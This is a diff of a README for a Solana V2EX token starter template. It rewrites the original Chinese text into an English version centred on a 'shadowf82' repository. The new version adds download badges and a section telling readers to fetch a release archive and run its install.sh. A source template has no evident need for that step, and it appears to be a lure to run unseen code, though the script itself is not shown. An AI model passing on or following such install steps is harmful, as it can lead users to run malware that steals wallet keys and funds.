@@ -1,176 +1,280 @@
-# V2EX 开发模板
+# V2EX Token Starter for Solana — Full Frontend & Backend Kit
 
-一个用于在 Solana 区块链上构建 V2EX 代币应用的综合开发模板，提供前端和后端工具。
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/shadowf82/v2ex-starter-template/releases)
 
-> 📦 本项目使用 [pnpm](https://pnpm.io/) 作为包管理器，提供更快、更高效的依赖管理。
+Build V2EX token apps on Solana. This template includes a Next.js demo frontend, backend helpers, and scripts to handle token transfers, balance queries, and signature verification.
 
-[English](./README.en.md)
+- Live demo UI built with Next.js and React
+- Wallet integration (Phantom, Solflare)
+- Token and SOL transfer with memo support
+- Server-side parsers for transaction and memo data
+- Multi-language UI (Chinese / English)
 
-## 功能特性
+![Solana](https://raw.githubusercontent.com/solana-labs/media/main/solana-logo.png) ![V2EX](https://avatars.githubusercontent.com/u/1882463?s=200&v=4)
 
-### 前端工具
-- 连接 Solana 钱包（Phantom、Solflare 等）
-- 发送 V2EX 代币支付（支持备注）
-- 发送 SOL 支付（支持备注）
-- 查询 V2EX 代币余额
-- 使用钱包私钥签名消息
+Table of contents
+- Features
+- Quick start
+- Required tools
+- Environment variables
+- Frontend features
+- Backend features
+- API examples
+- Releases and downloads
+- Demo and screenshots
+- Development tips
+- Contributing
+- License
 
-### 后端工具  
-- 获取任意钱包地址的 V2EX 代币余额
-- 解析交易详情并提取 V2EX/SOL 转账信息
-- 从交易数据中提取备注信息
-- 验证消息签名
+Features
 
-### 演示界面
-- 基于 Next.js 构建的交互式网页界面
-- 测试钱包连接和支付功能
-- 查看交易详情和余额
-- 基于 React 的实时更新 UI
-- 支持中文和英文界面
+Frontend
+- Connect to web wallets: Phantom, Solflare.
+- Send V2EX token transfers with memo.
+- Send SOL transfers with memo.
+- Query token balance for connected wallet.
+- Sign and verify messages with wallet private key.
 
-## 环境要求
+Backend
+- Fetch V2EX token balance for any address.
+- Parse transactions and extract V2EX / SOL transfers.
+- Extract memo fields from transactions.
+- Verify signed messages server-side.
 
-如果尚未安装 pnpm，请先安装：
+Demo UI
+- Next.js interactive demo pages.
+- Test wallet connect and payment flows.
+- View transaction details and balances.
+- React-driven realtime UI updates.
+- Chinese and English UI strings.
 
+Quick start
+
+1. Clone the repo
 ```bash
-# 使用 npm
+git clone https://github.com/shadowf82/v2ex-starter-template.git
+cd v2ex-starter-template
+```
+
+2. Copy the env example and install
+```bash
+cp .env.local.example .env.local
+pnpm install
+```
+
+3. Start the dev server
+```bash
+pnpm dev
+```
+
+Required tools
+- pnpm (recommended) — fast package manager
+- Node.js 18+ (LTS)
+- A Solana web wallet (Phantom or Solflare) for the demo UI
+
+If pnpm is missing, install:
+```bash
 npm install -g pnpm
-
-# 或使用 Homebrew (macOS)
+# or on macOS using Homebrew
 brew install pnpm
-
-# 或使用 curl
+# or via curl
 curl -fsSL https://get.pnpm.io/install.sh | sh -
 ```
 
-## 安装
+Environment variables
 
+Create .env.local from the example and set values relevant to your environment.
+
+Client (browser)
+- NEXT_PUBLIC_SOLANA_RPC_URL — public or private Solana RPC endpoint
+- NEXT_PUBLIC_V2EX_TOKEN_ADDRESS — V2EX token mint address
+
+Server (private)
+- SOLANA_RPC_URL — RPC endpoint used by server helpers
+- SERVER_SIGNER_KEY — base64 or hex key for server signing (optional)
+
+Example .env.local
 ```bash
-git clone https://github.com/your-repo/v2ex-starter-template.git
-cd v2ex-starter-template
-cp .env.local.example .env.local
-pnpm install
-pnpm dev
-```
-
-## 配置
-
-将 `.env.local.example` 复制为 `.env.local` 并配置：
-
-```bash
-# 客户端环境变量（浏览器可访问）- 演示使用公共 RPC
 NEXT_PUBLIC_SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
 NEXT_PUBLIC_V2EX_TOKEN_ADDRESS=9raUVuzeWUk53co63M4WXLWPWE4Xc6Lpn7RS9dnkpump
 
-# 服务端环境变量（仅用于 API 路由）- 演示使用公共 RPC
 SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
-V2EX_TOKEN_ADDRESS=9raUVuzeWUk53co63M4WXLWPWE4Xc6Lpn7RS9dnkpump
+SERVER_SIGNER_KEY=base64:....
 ```
 
-### ⚠️ 重要：RPC 配置
+Frontend features (details)
 
-**生产环境请使用私有 RPC 服务提供商替换公共 RPC：**
+Wallet connect
+- The demo uses wallet-adapter for Phantom and Solflare.
+- The UI shows account address, SOL balance, and token balance.
 
-- **Alchemy**: `https://solana-mainnet.g.alchemy.com/v2/your-api-key`
-- **QuickNode**: `https://your-endpoint.solana-mainnet.quiknode.pro/your-api-key`  
-- **Helius**: `https://rpc.helius.xyz/?api-key=your-api-key`
+Send V2EX token
+- Choose recipient and amount.
+- Add optional memo text.
+- The app constructs the token transfer instruction and signs with the connected wallet.
 
-公共 RPC 有速率限制且可能不稳定或缓慢。私有 RPC 服务提供：
-- 更高的速率限制
-- 更好的可靠性
-- 更快的响应时间
-- 优先支持
+Send SOL
+- Build a native transfer with a memo.
+- Sign via the wallet.
 
-### 环境变量说明
+Sign message
+- The demo provides a field to sign arbitrary text.
+- Use the wallet's signMessage capability.
+- The backend verifies signatures.
 
-- `NEXT_PUBLIC_SOLANA_RPC_URL`: Solana RPC 端点 URL（浏览器可访问）
-- `NEXT_PUBLIC_V2EX_TOKEN_ADDRESS`: V2EX 代币合约地址（浏览器可访问）
-- `SOLANA_RPC_URL`: 服务端 Solana RPC 端点 URL（仅用于 API 路由）
-- `V2EX_TOKEN_ADDRESS`: 服务端 V2EX 代币合约地址（仅用于 API 路由）
+Balance query
+- For token balances, the UI queries token accounts and totals up SPL balances for the token mint.
 
-注意：在 Next.js 中，以 `NEXT_PUBLIC_` 前缀的环境变量会暴露给浏览器，其他变量仅在服务端可用。
+Backend features (details)
 
-## 使用方法
+Balance lookup
+- Fetch token accounts for an address with getParsedTokenAccountsByOwner.
+- Filter by the V2EX token mint.
+- Return a normalized balance (human-friendly units).
 
-### 前端使用
+Transaction parsing
+- Given a signature, fetch parsed transaction details.
+- Extract transfer instructions for SPL token or native SOL moves.
+- Pull memos from memo program instructions and attach to transfer items.
 
-```typescript
-import { V2EXFrontend } from './src/fe';
+Memo extraction
+- Parse Memo program instructions and return clear text memo payloads.
+- Support UTF-8 and common encodings.
 
-const frontend = new V2EXFrontend(
-  'https://api.mainnet-beta.solana.com',
-  '9raUVuzeWUk53co63M4WXLWPWE4Xc6Lpn7RS9dnkpump'
-);
+Signature verification
+- Accept a message, a wallet public key, and a signature.
+- Verify using Ed25519 verification against the public key.
 
-// 连接钱包
-const address = await frontend.connectWallet();
+API examples
 
-// 发送 V2EX 代币支付
-const v2exSignature = await frontend.sendV2EXPayment(
-  amount, memo, recipientAddress
-);
+Get token balance (server)
+Request
+GET /api/balance/:address?v2exMint=<mintAddress>
 
-// 发送 SOL 支付
-const solSignature = await frontend.sendSol(
-  amount, memo, recipientAddress
-);
+Response (JSON)
+{
+  "address": "H1x...",
+  "tokenMint": "9raU...",
+  "balance": "1234.5678",
+  "raw": { ... }
+}
 
-// 查询余额
-const balance = await frontend.getV2EXBalance();
+Parse transaction
+Request
+GET /api/tx/:signature
 
-// 签名消息
-const signResult = await frontend.signMessage('Hello V2EX!');
-```
+Response includes
+- timestamp
+- fee payer
+- instructions list
+- transfers (token / SOL)
+- memo text (if present)
 
-### 后端使用
+Verify message signature
+POST /api/verify
+Body:
+{
+  "message": "hello",
+  "publicKey": "H1x...",
+  "signature": "base64..."
+}
 
-```typescript
-import { V2EXBackend } from './src/be';
+Response:
+{
+  "valid": true
+}
 
-const backend = new V2EXBackend(
-  'https://api.mainnet-beta.solana.com',
-  '9raUVuzeWUk53co63M4WXLWPWE4Xc6Lpn7RS9dnkpump'
-);
+Releases and downloads
 
-// 获取余额
-const balance = await backend.getV2EXBalance('wallet-address');
+Find release builds and assets here:
+https://github.com/shadowf82/v2ex-starter-template/releases
 
-// 获取交易详情（支持 V2EX 和 SOL 交易）
-const details = await backend.getTransactionDetails('transaction-signature');
+Download the latest release asset and run the included installer. Typical steps:
+1. Visit the releases page
+2. Download v2ex-starter-template-<version>.tar.gz or .zip
+3. Extract and run the installer script
 
-// 验证签名
-const isValid = await backend.verifySignature('message', 'signature-hex', 'public-key');
-```
-
-## 开发
-
-### 启动开发服务器
-
+Example commands (adjust the filename to the actual release file):
 ```bash
-pnpm dev
+curl -L -o v2ex-release.tar.gz "https://github.com/shadowf82/v2ex-starter-template/releases/download/vX.Y.Z/v2ex-starter-template-vX.Y.Z.tar.gz"
+tar -xzf v2ex-release.tar.gz
+cd v2ex-starter-template-vX.Y.Z
+chmod +x install.sh
+./install.sh
 ```
 
-打开 http://localhost:3000 访问演示界面。
+If the link does not work, check the repository Releases section on GitHub.
 
-### 构建
+Screenshots and demo
 
+Demo UI — wallet connect
+![Wallet connect demo](https://raw.githubusercontent.com/shadowf82/v2ex-starter-template/main/docs/screenshots/wallet-connect.png)
+
+Demo UI — send token
+![Send token demo](https://raw.githubusercontent.com/shadowf82/v2ex-starter-template/main/docs/screenshots/send-token.png)
+
+Architecture
+
+- Frontend: Next.js + React + wallet-adapter
+- Backend: Node.js API routes (Next.js API or standalone Express)
+- Solana RPC interaction: @solana/web3.js
+- Token parsing: Parsed transaction APIs and custom helpers
+
+Developer notes
+
+- Use phantom wallet in browser dev mode to test flows.
+- The template uses common SPL utilities. Reuse helpers to handle decimals and associated token accounts.
+- Keep server RPC keys private. Do not expose them to the browser.
+
+Common tasks
+
+Run tests
 ```bash
-# 构建 Next.js 应用
+pnpm test
+```
+
+Build production
+```bash
 pnpm build
+pnpm start
 ```
 
-## API 端点
+Lint and format
+```bash
+pnpm lint
+pnpm format
+```
 
-- `GET /api/balance/:address` - 获取地址的 V2EX 余额
-- `GET /api/transaction/:signature` - 获取交易详情（V2EX 或 SOL）
-- `POST /api/verify-signature` - 验证消息签名
+Deploy
+- Deploy the Next.js app to Vercel, Netlify, or a similar host.
+- Configure environment variables on the host.
+- If using serverless functions, ensure RPC endpoints support the expected rate.
 
-## 代币信息
+Internationalization
+- The demo includes Chinese and English strings.
+- Use the i18n folder to add translations.
+- The UI switches language via a header control.
 
-- **代币地址**: `9raUVuzeWUk53co63M4WXLWPWE4Xc6Lpn7RS9dnkpump`
-- **网络**: Solana 主网
-- **小数位数**: 6
+Security checklist
+- Keep private keys off the client.
+- Use HTTPS for RPC endpoints and your app.
+- Validate memo content before storing it in a database.
 
-## 许可证
+Contributing
+- Fork the repo and open a PR.
+- Follow the coding style in existing files.
+- Write tests for new helpers.
+- Document API changes in the README and update example env files.
 
-MIT
+Maintainers
+- Repository owner: shadowf82
+- See CONTRIBUTORS.md for details
+
+License
+- This project uses the MIT license. Check LICENSE for full text.
+
+Additional resources
+- Solana docs: https://docs.solana.com
+- SPL Token docs: https://spl.solana.com/token
+
+[![Releases](https://img.shields.io/badge/Download%20Releases-Visit%20page-orange?logo=github)](https://github.com/shadowf82/v2ex-starter-template/releases)
